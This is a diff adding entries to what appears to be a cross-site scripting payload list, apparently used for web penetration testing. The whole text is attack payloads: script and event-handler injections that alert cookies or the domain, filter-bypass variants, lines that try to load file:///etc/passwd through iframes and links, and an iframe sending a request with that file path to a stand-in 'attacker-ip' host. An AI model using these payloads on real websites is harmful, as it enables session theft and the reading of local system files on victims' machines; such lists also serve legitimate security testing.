@@ -50,6 +50,9 @@ https://brutelogic.com.br/poc.svg
 http://xss.rocks/scriptlet.html
 javascript:alert(document.cookie)
 poc.svg = <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+"><script>alert(1)</script>
+'or<script>alert(1)</script>
+'or<img src=0 onerror=alert('1')>
 <script <script>>alert('Gotcha')</script>  
 <audio src/onerror=alert('Gotcha')>
 <iframe src=javascript:alert('Gotcha')>
@@ -104,3 +107,6 @@ javascript:alert(document.cookie)
 ?s="onerror="window.onerror=alert;throw 1337"
 ?s="onerror="alert%261par;1337%26rpar;"
 ?s="onerror="alert`1337`"
+<img src="xxx" onerror="document.write('\<iframe src=file:///etc/passwd>\</iframe>')"/>
+<link rel=attachment href="file:///etc/passwd">
+<iframe src="http://attacker-ip/test.php?file=/etc/passwd">\</iframe>
